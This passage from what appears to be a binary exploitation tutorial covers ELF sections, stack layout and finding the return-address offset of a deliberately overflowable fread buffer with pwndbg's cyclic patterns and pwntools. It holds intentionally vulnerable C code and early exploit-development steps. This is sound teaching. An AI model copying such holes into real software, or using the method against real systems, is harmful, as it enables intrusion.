</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>const</span> <span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>g_buf_const</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>32</span><span style=color:#000;font-weight:700>]</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#34;Hello, world</span><span style=color:#4e9a06>\n</span><span style=color:#4e9a06>&#34;</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>main</span><span style=color:#000;font-weight:700>(</span><span style=color:#204a87;font-weight:700>void</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>l_buf</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>32</span><span style=color:#000;font-weight:700>];</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>static</span> <span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>s_l_buf</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>32</span><span style=color:#000;font-weight:700>];</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>char</span> <span style=color:#ce5c00;font-weight:700>*</span><span style=color:#000>heap_buf</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>malloc</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>32</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#000>free</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>heap_buf</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>return</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span>
</span></span></code></pre></div><p>Check the common binary sections and symbols. Use the usual coomands (<code>readelf -S</code>, <code>nm</code>).
Observe in which section each variable is located and the section flags.</p><pre>
$ readelf -S buffers
...
  [16] .rodata           PROGBITS         <b>0000000000402000</b>  00002000
       0000000000000040  0000000000000000   <b>A</b>       0     0     32
...
  [24] .data             PROGBITS         <b>0000000000404040</b>  00003040
       0000000000000040  0000000000000000  <b>WA</b>       0     0     32
  [25] .bss              NOBITS           <b>0000000000404080</b>  00003080
       0000000000000060  0000000000000000  <b>WA</b>       0     0     32
...
Key to Flags:
  W (write), A (alloc), X (execute)

$ nm buffers
...
<b>0000000000402020 R</b> g_buf_const
<b>0000000000404060 D</b> g_buf_init_vals
<b>00000000004040a0 B</b> g_buf_init_zero

Key to Flags:
  R (symbol is read-only)
  D (symbol in initialized data section)
  B (symbol in BSS data section)

  A lowercase flag means variable is not visible local (not visible outside the object)
</pre><p>You can also inspect these programmatically using pwntools and the ELF class:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#204a87;font-weight:700>from</span> <span style=color:#000>pwn</span> <span style=color:#204a87;font-weight:700>import</span> <span style=color:#ce5c00;font-weight:700>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>elf</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>ELF</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;buffers&#39;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>bss</span>    <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>elf</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>get_section_by_name</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;.bss&#39;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000>data</span>   <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>elf</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>get_section_by_name</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;.data&#39;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000>rodata</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>elf</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>get_section_by_name</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;.rodata&#39;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>bss_addr</span>    <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>bss</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;sh_addr&#39;</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span><span style=color:#000>data_addr</span>   <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>data</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;sh_addr&#39;</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span><span style=color:#000>rodata_addr</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>rodata</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;sh_addr&#39;</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>bss_size</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>bss</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;sh_size&#39;</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span><span style=color:#000>data_size</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>data</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;sh_size&#39;</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span><span style=color:#000>rodata_size</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>rodata</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;sh_size&#39;</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># A (Alloc) = 1 &lt;&lt; 1 = 2</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># W (Write) = 1 &lt;&lt; 0 = 1</span>
</span></span><span style=display:flex><span><span style=color:#000>bss_flags</span>    <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>bss</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;sh_flags&#39;</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span><span style=color:#000>data_flags</span>   <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>data</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;sh_flags&#39;</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span><span style=color:#000>rodata_flags</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>rodata</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;sh_flags&#39;</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87>print</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Section info:&#34;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#204a87>print</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;.bss:    0x</span><span style=color:#4e9a06>{:08x}</span><span style=color:#4e9a06>-0x</span><span style=color:#4e9a06>{:08x}</span><span style=color:#4e9a06>, </span><span style=color:#4e9a06>{}</span><span style=color:#4e9a06>&#34;</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>format</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>bss_addr</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>bss_addr</span><span style=color:#ce5c00;font-weight:700>+</span><span style=color:#000>bss_size</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>bss_flags</span><span style=color:#000;font-weight:700>))</span>
</span></span><span style=display:flex><span><span style=color:#204a87>print</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;.data:   0x</span><span style=color:#4e9a06>{:08x}</span><span style=color:#4e9a06>-0x</span><span style=color:#4e9a06>{:08x}</span><span style=color:#4e9a06>, </span><span style=color:#4e9a06>{}</span><span style=color:#4e9a06>&#34;</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>format</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>data_addr</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>data_addr</span><span style=color:#ce5c00;font-weight:700>+</span><span style=color:#000>data_size</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>data_flags</span><span style=color:#000;font-weight:700>))</span>
</span></span><span style=display:flex><span><span style=color:#204a87>print</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;.rodata: 0x</span><span style=color:#4e9a06>{:08x}</span><span style=color:#4e9a06>-0x</span><span style=color:#4e9a06>{:08x}</span><span style=color:#4e9a06>, </span><span style=color:#4e9a06>{}</span><span style=color:#4e9a06>&#34;</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>format</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>rodata_addr</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>rodata_addr</span><span style=color:#ce5c00;font-weight:700>+</span><span style=color:#000>rodata_size</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>rodata_flags</span><span style=color:#000;font-weight:700>))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87>print</span><span style=color:#000;font-weight:700>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87>print</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Variable info:&#34;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#204a87>print</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;g_buf_init_zero: 0x</span><span style=color:#4e9a06>{:08x}</span><span style=color:#4e9a06>&#34;</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>format</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>elf</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>symbols</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>g_buf_init_zero</span><span style=color:#000;font-weight:700>))</span>
</span></span><span style=display:flex><span><span style=color:#204a87>print</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;g_buf_init_vals: 0x</span><span style=color:#4e9a06>{:08x}</span><span style=color:#4e9a06>&#34;</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>format</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>elf</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>symbols</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>g_buf_init_vals</span><span style=color:#000;font-weight:700>))</span>
</span></span><span style=display:flex><span><span style=color:#204a87>print</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;g_buf_const:     0x</span><span style=color:#4e9a06>{:08x}</span><span style=color:#4e9a06>&#34;</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>format</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>elf</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>symbols</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>g_buf_const</span><span style=color:#000;font-weight:700>))</span>
</span></span></code></pre></div><p>Another handy utility is the <code>vmmap</code> command in <code>pwndbg</code> which shows all memory maps of the process at runtime:</p><pre tabindex=0><code class=language-gdb data-lang=gdb>pwndbg&gt; b main
pwngdb&gt; run
pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r--p     1000 0      /home/user/buffers
          0x401000           0x402000 r-xp     1000 1000   /home/user/buffers
          0x402000           0x403000 r--p     1000 2000   /home/user/buffers
          0x403000           0x404000 r--p     1000 2000   /home/user/buffers
          0x404000           0x405000 rw-p     1000 3000   /home/user/buffers
    0x7ffff7dc9000     0x7ffff7dcb000 rw-p     2000 0
...
    0x7ffffffdd000     0x7ffffffff000 rw-p    22000 0      [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]
</code></pre><p>Non-static local variables and dynamically allocated buffers cannot be seen in the executable (they have meaning only at runtime, because they are allocated on the stack or heap in a function scope). The symbol names aren&rsquo;t found anywhere in the binary, except if debug symbols are enabled (<code>-g</code> flag).</p><h2 id=stack-buffer-overflow>Stack buffer overflow</h2><img src=./assets/stack_x86_64.png width=600><blockquote><p><i>Note that this is the stack for a 64bit system and the first couple of function arguments are stored in registers (rdi, rsi, rdx, rcx, r8, and r9) and that&rsquo;s why the images has <code>arg_6</code> as the first argument.</i></p></blockquote><p>We should know by now that the stack serves multiple purposes:</p><ul><li>Passing function arguments from the caller to the callee</li><li>Storing local variables for functions</li><li>Temporarily saving register values before a call</li><li>Saving the return address and old frame pointer</li></ul><p>Even though, in an abstract sense, different buffers are separate from one another, ultimately they are just some regions of memory which do not have any intrinsic identification or associated size. To avoid this, most hight level languages use size metadata and bound checks to detect out of bounds accesses to the memory.</p><p>But in our case, bounds are unchecked, therefore it is up to the programmer to code carefully. This includes checking for any overflows and using <strong>safe functions</strong>. Unfortunately, many functions in the standard C library, particularly those which work with strings and read user input, are unsafe - nowadays, the compiler will issue warnings when encountering them.</p><h3 id=buffer-size-and-offset-identification>Buffer size and offset identification</h3><p>When trying to overflow a buffer on the stack we need to know the size and where the buffer is in memory relative to the saved return address (or some other control flow altering value/pointer).</p><h4 id=static-analysis>Static Analysis</h4><p>One way, for simple programs, you can do <strong>static analysis</strong> and check some key points in the diassembled code.</p><p>For example, this simple program (<code>00-tutorial/simple_read</code>, run <code>make simple_read</code> to compile):</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#include</span> <span style=color:#8f5902;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#8f5902;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>main</span><span style=color:#000;font-weight:700>(</span><span style=color:#204a87;font-weight:700>void</span><span style=color:#000;font-weight:700>)</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>buf</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>128</span><span style=color:#000;font-weight:700>];</span>
</span></span><span style=display:flex><span>    <span style=color:#000>fread</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>buf</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>256</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>stdin</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>return</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span>
</span></span></code></pre></div><p>generates the following assembly:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span><span style=color:#000>push</span>   <span style=color:#204a87>rbp</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span>    <span style=color:#204a87>rbp</span><span style=color:#000;font-weight:700>,</span><span style=color:#204a87>rsp</span>
</span></span><span style=display:flex><span><span style=color:#000>sub</span>    <span style=color:#204a87>rsp</span><span style=color:#000;font-weight:700>,</span><span style=color:#0000cf;font-weight:700>0x90</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span>    <span style=color:#204a87>rax</span><span style=color:#000;font-weight:700>,</span><span style=color:#204a87;font-weight:700>QWORD</span> <span style=color:#000>PTR</span> <span style=color:#204a87>fs</span><span style=color:#000;font-weight:700>:</span><span style=color:#0000cf;font-weight:700>0x28</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span>    <span style=color:#204a87;font-weight:700>QWORD</span> <span style=color:#000>PTR</span> <span style=color:#000;font-weight:700>[</span><span style=color:#204a87>rbp</span><span style=color:#ce5c00;font-weight:700>-</span><span style=color:#0000cf;font-weight:700>0x8</span><span style=color:#000;font-weight:700>],</span><span style=color:#204a87>rax</span>
</span></span><span style=display:flex><span><span style=color:#000>xor</span>    <span style=color:#204a87>eax</span><span style=color:#000;font-weight:700>,</span><span style=color:#204a87>eax</span>
</span></span><span style=display:flex><span><span style=color:#a40000>#</span> <span style=color:#204a87;font-weight:700>import</span><span style=color:#000>ant</span> <span style=color:#000>bit</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span>    <span style=color:#204a87>rdx</span><span style=color:#000;font-weight:700>,</span><span style=color:#204a87;font-weight:700>QWORD</span> <span style=color:#000>PTR</span> <span style=color:#000;font-weight:700>[</span><span style=color:#000>rip</span><span style=color:#ce5c00;font-weight:700>+</span><span style=color:#0000cf;font-weight:700>0x2ed6</span><span style=color:#000;font-weight:700>]</span>        <span style=color:#a40000>#</span> <span style=color:#0000cf;font-weight:700>4040</span> <span style=color:#ce5c00;font-weight:700>&lt;</span><span style=color:#000>stdin@@GLIBC_2.2.5</span><span style=color:#ce5c00;font-weight:700>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#000>lea</span>    <span style=color:#204a87>rax</span><span style=color:#000;font-weight:700>,[</span><span style=color:#204a87>rbp</span><span style=color:#ce5c00;font-weight:700>-</span><span style=color:#0000cf;font-weight:700>0x90</span><span style=color:#000;font-weight:700>]</span>                    <span style=color:#a40000>#</span> <span style=color:#ce5c00;font-weight:700>&lt;-</span> <span style=color:#000>stack</span> <span style=color:#000>buffer</span> <span style=color:#000>starts</span> <span style=color:#000>at</span> <span style=color:#204a87>rbp</span><span style=color:#ce5c00;font-weight:700>-</span><span style=color:#0000cf;font-weight:700>0x90</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span>    <span style=color:#204a87>rcx</span><span style=color:#000;font-weight:700>,</span><span style=color:#204a87>rdx</span>                           <span style=color:#a40000>#</span> <span style=color:#ce5c00;font-weight:700>&lt;-</span> <span style=color:#0000cf;font-weight:700>4</span><span style=color:#000>th</span> <span style=color:#000>argument</span> <span style=color:#000>fo</span> <span style=color:#000>fread</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>stdin</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span>    <span style=color:#204a87>edx</span><span style=color:#000;font-weight:700>,</span><span style=color:#0000cf;font-weight:700>0x100</span>                         <span style=color:#a40000>#</span> <span style=color:#ce5c00;font-weight:700>&lt;-</span> <span style=color:#0000cf;font-weight:700>3</span><span style=color:#000>rd</span> <span style=color:#000>argument</span> <span style=color:#000>of</span> <span style=color:#000>fread</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>number</span> <span style=color:#000>of</span> <span style=color:#000>elements</span> <span style=color:#000>read</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span>    <span style=color:#204a87>esi</span><span style=color:#000;font-weight:700>,</span><span style=color:#0000cf;font-weight:700>0x1</span>                           <span style=color:#a40000>#</span> <span style=color:#ce5c00;font-weight:700>&lt;-</span> <span style=color:#0000cf;font-weight:700>2</span><span style=color:#000>nd</span> <span style=color:#000>argument</span> <span style=color:#000>of</span> <span style=color:#000>fread</span><span style=color:#000;font-weight:700>,</span> <span style=color:#204a87>si</span><span style=color:#000>ze</span> <span style=color:#000>of</span> <span style=color:#000>element</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span>    <span style=color:#204a87>rdi</span><span style=color:#000;font-weight:700>,</span><span style=color:#204a87>rax</span>                           <span style=color:#a40000>#</span> <span style=color:#ce5c00;font-weight:700>&lt;-</span> <span style=color:#0000cf;font-weight:700>1</span><span style=color:#000>st</span> <span style=color:#000>argument</span> <span style=color:#000>of</span> <span style=color:#000>fread</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>buffer</span> <span style=color:#000>address</span> <span style=color:#000>saved</span> <span style=color:#000>in</span> <span style=color:#204a87>RAX</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000>call</span>   <span style=color:#0000cf;font-weight:700>1030</span> <span style=color:#ce5c00;font-weight:700>&lt;</span><span style=color:#000>fread@plt</span><span style=color:#ce5c00;font-weight:700>&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>push</span>   <span style=color:#204a87>rbp</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span>    <span style=color:#204a87>rbp</span><span style=color:#000;font-weight:700>,</span><span style=color:#204a87>rsp</span>
</span></span><span style=display:flex><span><span style=color:#000>add</span>    <span style=color:#204a87>rsp</span><span style=color:#000;font-weight:700>,</span><span style=color:#0000cf;font-weight:700>0xffffffffffffff80</span>
</span></span><span style=display:flex><span><span style=color:#a40000>#</span> <span style=color:#a40000>---</span> <span style=color:#204a87;font-weight:700>import</span><span style=color:#000>ant</span> <span style=color:#000>bit</span> <span style=color:#ce5c00;font-weight:700>---</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span>    <span style=color:#204a87>rdx</span><span style=color:#000;font-weight:700>,</span><span style=color:#204a87;font-weight:700>QWORD</span> <span style=color:#000>PTR</span> <span style=color:#000;font-weight:700>[</span><span style=color:#000>rip</span><span style=color:#ce5c00;font-weight:700>+</span><span style=color:#0000cf;font-weight:700>0x2efb</span><span style=color:#000;font-weight:700>]</span>        <span style=color:#a40000>#</span> <span style=color:#0000cf;font-weight:700>404030</span> <span style=color:#ce5c00;font-weight:700>&lt;</span><span style=color:#000>stdin@@GLIBC_2.2.5</span><span style=color:#ce5c00;font-weight:700>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#000>lea</span>    <span style=color:#204a87>rax</span><span style=color:#000;font-weight:700>,[</span><span style=color:#204a87>rbp</span><span style=color:#ce5c00;font-weight:700>-</span><span style=color:#0000cf;font-weight:700>0x80</span><span style=color:#000;font-weight:700>]</span>  <span style=color:#a40000>#</span> <span style=color:#ce5c00;font-weight:700>&lt;-</span> <span style=color:#000>stack</span> <span style=color:#000>buffer</span> <span style=color:#000>starts</span> <span style=color:#000>at</span> <span style=color:#204a87>rbp</span><span style=color:#ce5c00;font-weight:700>-</span><span style=color:#0000cf;font-weight:700>0x80</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span>    <span style=color:#204a87>rcx</span><span style=color:#000;font-weight:700>,</span><span style=color:#204a87>rdx</span>         <span style=color:#a40000>#</span> <span style=color:#ce5c00;font-weight:700>&lt;-</span> <span style=color:#0000cf;font-weight:700>4</span><span style=color:#000>th</span> <span style=color:#000>argument</span> <span style=color:#000>fo</span> <span style=color:#000>fread</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>stdin</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span>    <span style=color:#204a87>edx</span><span style=color:#000;font-weight:700>,</span><span style=color:#0000cf;font-weight:700>0x100</span>       <span style=color:#a40000>#</span> <span style=color:#ce5c00;font-weight:700>&lt;-</span> <span style=color:#0000cf;font-weight:700>3</span><span style=color:#000>rd</span> <span style=color:#000>argument</span> <span style=color:#000>of</span> <span style=color:#000>fread</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>number</span> <span style=color:#000>of</span> <span style=color:#000>elements</span> <span style=color:#000>read</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span>    <span style=color:#204a87>esi</span><span style=color:#000;font-weight:700>,</span><span style=color:#0000cf;font-weight:700>0x1</span>         <span style=color:#a40000>#</span> <span style=color:#ce5c00;font-weight:700>&lt;-</span> <span style=color:#0000cf;font-weight:700>2</span><span style=color:#000>nd</span> <span style=color:#000>argument</span> <span style=color:#000>of</span> <span style=color:#000>fread</span><span style=color:#000;font-weight:700>,</span> <span style=color:#204a87>si</span><span style=color:#000>ze</span> <span style=color:#000>of</span> <span style=color:#000>element</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span>    <span style=color:#204a87>rdi</span><span style=color:#000;font-weight:700>,</span><span style=color:#204a87>rax</span>         <span style=color:#a40000>#</span> <span style=color:#ce5c00;font-weight:700>&lt;-</span> <span style=color:#0000cf;font-weight:700>1</span><span style=color:#000>st</span> <span style=color:#000>argument</span> <span style=color:#000>of</span> <span style=color:#000>fread</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>buffer</span> <span style=color:#000>address</span> <span style=color:#000>saved</span> <span style=color:#000>in</span> <span style=color:#204a87>RAX</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000>call</span>   <span style=color:#0000cf;font-weight:700>401030</span> <span style=color:#ce5c00;font-weight:700>&lt;</span><span style=color:#000>fread@plt</span><span style=color:#ce5c00;font-weight:700>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#a40000>#</span> <span style=color:#a40000>---------------------</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span>    <span style=color:#204a87>eax</span><span style=color:#000;font-weight:700>,</span><span style=color:#0000cf;font-weight:700>0x0</span>
</span></span><span style=display:flex><span><span style=color:#000>leave</span>
</span></span><span style=display:flex><span><span style=color:#000>ret</span>
</span></span></code></pre></div><p>Looking at the <code>fread</code> arguments we can see the buffer start relative to <code>RBP</code> and the number of bytes read. <code>RBP-0x80+0x100*0x1 = RBP+0x80</code>, so the fread function can read 128 bytes after <code>RBP</code> -> return address stored at 136 bytes after <code>RBP</code>.</p><img src=./assets/stack_buffer.png width=600><h4 id=dynamic-analysis>Dynamic analysis</h4><p>You can determine offsets at runtime in a more automated way with pwndbg using an <a href=https://en.wikipedia.org/wiki/De_Bruijn_sequence>De Bruijin sequences</a> which produces strings where every substring of length N appears only once in the sequence; in our case it helps us identify the offset of an exploitable memory value relative to the buffer.</p><p>For a simple buffer overflow the worflow is:</p><ol><li>generate an long enough sequence to guarantee a buffer overflow</li><li>feed the generated sequence to the input function in the program</li><li>the program will produce a segmentation fault when reaching the invalid return address on the stack</li><li>search the offset of the faulty address in the generated pattern to get an offset</li></ol><p>In pwndbg this works as such:</p><pre tabindex=0><code>pwndbg&gt; cyclic -n 8 256
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaab
pwndbg&gt; run
...
pwndbg&gt;
&lt;reading input, paste the generated pattern&gt;
...
pwndbg&gt; continue
...
Program received signal SIGSEGV, Segmentation fault
...
   0x401141 &lt;main+27&gt;    mov    esi, 1
   0x401146 &lt;main+32&gt;    mov    rdi, rax
   0x401149 &lt;main+35&gt;    call   fread@plt &lt;fread@plt

   0x40114e &lt;main+40&gt;    mov    eax, 0
   0x401153 &lt;main+45&gt;    leave
 ► 0x401154 &lt;main+46&gt;    ret    &lt;0x6161616161616172&gt;
...
pwndbg&gt; cyclic -n 8 -c 64 -l 0x6161616161616172
136
</code></pre><p><em>Note: we get the same 136 offset computed manually with the static analysis method.</em></p><h2 id=input-output-functions>Input-Output functions</h2><p>Most programs aren&rsquo;t a straight forward single input buffer overflow so we need to deal with things like:</p><ul><li>automizing program input-output - by programmatically sending and receiving data</li><li>parsing program output - to use potential leaked information</li><li>understand the mechanics of the IO methods used - what kind of data they accept and possible constraints</li></ul><p><em>Pwntools</em> offers a large area of <a href=https://docs.pwntools.com/en/stable/tubes.html>IO functions</a> to communicate with a program (either local or remote).
The basic and usual ones are:</p><ul><li><code>send(data)</code> - sends the <code>data</code> byte string to the process</li><li><code>sendline(data)</code> - shorthand for <code>send(data + b"\n")</code></li><li><code>recv(num)</code> - recieves <code>num</code> bytes from the process</li><li><code>recvline()</code> - recieves a whole line from the process (until &lsquo;\n&rsquo;)</li><li><code>recvuntil(str)</code> - receives data until <code>str</code> is found (will not contain <code>str</code>)</li><li><code>recvall()</code> - receives the full program ouptut (until EOF)</li></ul><blockquote><p>Check the documentation for more complex IO functions that might come in handy (like <code>recvregex</code>, <code>sendafter</code>).</p></blockquote><p>It is also important to understand the functionality of the different IO functions the program itself uses. For C programs, in our case, you can always
